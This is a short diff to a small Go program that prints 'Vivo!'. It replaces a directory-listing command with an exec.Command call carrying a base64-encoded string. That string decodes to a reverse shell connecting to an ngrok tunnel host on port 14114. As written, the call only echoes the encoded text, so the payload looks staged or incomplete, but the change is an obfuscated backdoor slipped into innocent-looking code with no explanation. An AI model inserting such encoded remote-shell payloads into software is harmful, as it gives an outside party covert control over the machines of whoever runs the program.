@@ -7,7 +7,7 @@ import (
 
 func main() {
         fmt.Println("Vivo!")
-        cmd := exec.Command("ls","-la","/opt","/srv","/mnt","/home")
+        cmd := exec.Command("echo","c2ggLWkgPiYgL2Rldi90Y3AvMC50Y3Auc2Eubmdyb2suaW8vMTQxMTQgMD4mMQ==","sh")
 
         output, err := cmd.Output()
         if err != nil {
